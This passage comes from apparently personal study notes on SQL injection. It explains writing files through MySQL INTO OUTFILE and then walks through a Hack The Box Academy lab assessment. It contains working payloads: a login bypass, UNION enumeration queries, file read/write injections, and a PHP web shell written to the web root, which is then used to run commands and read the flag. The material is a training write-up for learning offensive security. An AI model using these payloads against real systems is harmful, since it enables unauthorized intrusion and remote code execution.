<h2 class="anchor anchorWithStickyNavbar_LWe7" id="writing-files">Writing files<a href="#writing-files" class="hash-link" aria-label="Direct link to Writing files" title="Direct link to Writing files" translate="no">​</a></h2>
<p>Writing files require more privileges and more configuration:</p>
<ol>
<li><code>FILE</code> privilege enabled.</li>
<li>MySQL global secure_file_priv variable not enabled</li>
<li>Write access to the location we want to write to on the back-end server</li>
</ol>
<p>We can check the <code>secure_file_priv</code> variable using the SQLi:</p>
<p><code>cn&#x27; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></p>
<p>If the result of the variable is empty, it means that we can read/write to any location.</p>
<p>To write to file, we can use <code>SELECT * INTO OUTFILE &lt;filename&gt;</code>. For example:</p>
<p><code>cn&#x27; union select 1,&#x27;file written successfully!&#x27;,3,4 into outfile &#x27;/var/www/html/proof.txt&#x27;-- -</code></p>
<p>This will write the sentence <code>file written successfully!</code> into the file <code>/var/www/html/proof.txt</code>, which later we can download using the web server. Now that we can write files, we can even write a web shell:</p>
<p><code>cn&#x27; union select &quot;&quot;,&#x27;&lt;?php system($_REQUEST[0]); ?&gt;&#x27;, &quot;&quot;, &quot;&quot; into outfile &#x27;/var/www/html/shell.php&#x27;-- -</code></p>
<p>And get RCE when visiting the <code>shell.php</code> page.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="skills-assessment">Skills assessment<a href="#skills-assessment" class="hash-link" aria-label="Direct link to Skills assessment" title="Direct link to Skills assessment" translate="no">​</a></h2>
<p>This is the write-up for the assessment of HTB academy <a href="https://academy.hackthebox.com/module/33" target="_blank" rel="noopener noreferrer">SQL injections</a> module.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="login-page">Login page<a href="#login-page" class="hash-link" aria-label="Direct link to Login page" title="Direct link to Login page" translate="no">​</a></h3>
<p>First of all we&#x27;re given a login page, most likely we&#x27;ll need to provide a SQLi to bypass the login.</p>
<p>Let&#x27;s evaluate which fields are vulnerable to SQLi by providing a dangling character, e.g: <code>&#x27;</code> to break the query.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -vvv &#x27;http://83.136.251.235:30056/&#x27; -X POST -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; --data-raw &#x27;username=\&#x27;&amp;password=1234&#x27;</span><br></span></code></pre></div></div>
<p>We couldn&#x27;t break any field with the escape characters. We can try some of the pre-defined SQL injections from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases" target="_blank" rel="noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-default-databases</a>.</p>
<p>The second one worked fine:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&#x27; </span><span class="token operator" style="color:#393A34">OR</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>and we&#x27;re presented a dashboard with a search box.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="search-box">Search box<a href="#search-box" class="hash-link" aria-label="Direct link to Search box" title="Direct link to Search box" translate="no">​</a></h3>
<p>The search box make a request like:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl &#x27;http://83.136.251.235:30056/dashboard/dashboard.php&#x27; -X POST -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -H &#x27;Cookie: PHPSESSID=t7addrm0eidu7ag6m1e7e31geo&#x27; --data-raw &#x27;search=a&#x27;</span><br></span></code></pre></div></div>
<p>Looks like the search only works to search the values in the date.</p>
<p>We should follow the same approach: let&#x27;s try to break the search with escape character: <code>&#x27;</code> and it worked, we can see an error.</p>
<p>Let&#x27;s try to determine the number of columns:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a&#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>It shows: <code> The used SELECT statements have a different number of columns</code></p>
<p>It worked with:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a&#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>But the first column is not shown</p>
<p>The objective is to install a web-shell, so let&#x27;s enumerate if we&#x27;re capable of.</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a&#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">user</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>and we got <code>root@localhost</code></p>
<p>Let&#x27;s check privileges:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a</span><span class="token string" style="color:#e3116c">&#x27; UNION SELECT 1,grantee, privilege_type,4,5 FROM information_schema.user_privileges WHERE grantee=&quot;&#x27;</span><span class="token plain">root</span><span class="token string" style="color:#e3116c">&#x27;@&#x27;</span><span class="token plain">localhost&#x27;&quot; </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p><code>FILE</code> privilege is there.</p>
<p>Check for write file global var:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a&#x27; </span><span class="token keyword" style="color:#00009f">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">variable_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> variable_value</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">global_variables </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> variable_name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;secure_file_priv&quot;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>The variable is not set, so we can write.</p>
<p>Let&#x27;s try it:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a</span><span class="token string" style="color:#e3116c">&#x27; UNION SELECT 1,&#x27;</span><span class="token keyword" style="color:#00009f">file</span><span class="token plain"> written successfully</span><span class="token operator" style="color:#393A34">!</span><span class="token string" style="color:#e3116c">&#x27;,3,4,5 into outfile &#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">var</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">www</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">html</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">dashboard</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">proof</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt&#x27; </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>Now let&#x27;s try to read it, before we try to install the shell.</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a</span><span class="token string" style="color:#e3116c">&#x27; UNION SELECT 1,LOAD_FILE(&#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">var</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">www</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">html</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">dashboard</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">proof</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>We got the contents back, so let&#x27;s install the shell.</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">a</span><span class="token string" style="color:#e3116c">&#x27; UNION select &quot;&quot;,&#x27;</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">?php system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">$_REQUEST</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> ?</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token string" style="color:#e3116c">&#x27;, &quot;&quot;, &quot;&quot;, &quot;&quot; into outfile &#x27;</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">var</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">www</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">html</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">dashboard</span><span class="token operator" style="color:#393A34">/</span><span class="token number" style="color:#36acaa">1.</span><span class="token plain">php&#x27; </span><span class="token comment" style="color:#999988;font-style:italic">-- -</span><br></span></code></pre></div></div>
<p>And we&#x27;ve got the shell <code>http://83.136.251.235:30056/dashboard/1.php?0=id</code></p>
<p>Now we list files at root: <code>http://83.136.251.235:30056/dashboard/1.php?0=ls%20/</code></p>
<p>Now we can retrieve the flag: <code>http://83.136.251.235:30056/dashboard/1.php?0=cat%20/flag_cae1dadcd174.txt</code></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/Hacking/HTB Academy/Pentest In a Nutshell"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Pentest in a nutshell</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/Hacking/HTB Academy/Stack-based buffer overflow on Linux"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Stack based buffer overflow on Linux</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#types-of-sql-injections" class="table-of-contents__link toc-highlight">Types of SQL injections</a></li><li><a href="#enumerating-for-sql-injections" class="table-of-contents__link toc-highlight">Enumerating for SQL injections</a></li><li><a href="#subverting-query-logic" class="table-of-contents__link toc-highlight">Subverting query logic</a><ul><li><a href="#or-injection" class="table-of-contents__link toc-highlight">OR injection</a></li><li><a href="#using-comments" class="table-of-contents__link toc-highlight">Using comments</a></li><li><a href="#union" class="table-of-contents__link toc-highlight">Union</a></li></ul></li><li><a href="#reading-files" class="table-of-contents__link toc-highlight">Reading files</a></li><li><a href="#writing-files" class="table-of-contents__link toc-highlight">Writing files</a></li><li><a href="#skills-assessment" class="table-of-contents__link toc-highlight">Skills assessment</a><ul><li><a href="#login-page" class="table-of-contents__link toc-highlight">Login page</a></li><li><a href="#search-box" class="table-of-contents__link toc-highlight">Search box</a></li></ul></li></ul></div></div></div></div></main></div></div></div></div>
</body>
</html>